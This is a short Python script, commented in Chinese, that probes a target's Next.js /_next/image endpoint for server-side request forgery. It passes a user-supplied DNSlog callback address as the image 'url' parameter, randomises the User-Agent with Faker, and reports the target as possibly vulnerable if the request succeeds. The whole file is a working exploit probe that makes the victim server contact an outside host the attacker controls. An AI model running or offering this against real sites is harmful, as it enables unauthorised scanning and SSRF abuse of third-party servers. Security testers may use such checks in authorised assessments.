import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的GET请求。存在问题的路径为/_next/image',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送get请求')
parser.add_argument('-d', '--DNSlog', type=str, help='输入你的DNSlog地址')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/_next/image"  # 移除末尾的斜杠
    else:
        url = args.url + "/_next/image"
    if args.DNSlog:
        DNSlog = args.DNSlog
    else:
        print("Please provide a valid DNSlog using -d or --DNSlog argument.")
        exit()
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()


headers = {
    'User-Agent': fake.user_agent(),
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept-Encoding': 'gzip'
}

params = {
    "w": "16",
    "q": "10",
    "url":  DNSlog 
}

response = requests.get(url, headers=headers,params=params)
if response.status_code == 200:
    print("目标url："+ url + '\n' +"可能存在该漏洞，请查看DNSlog")
else:
    print("目标url："+ url + '\n' +"不存在该漏洞")
# print(response.text)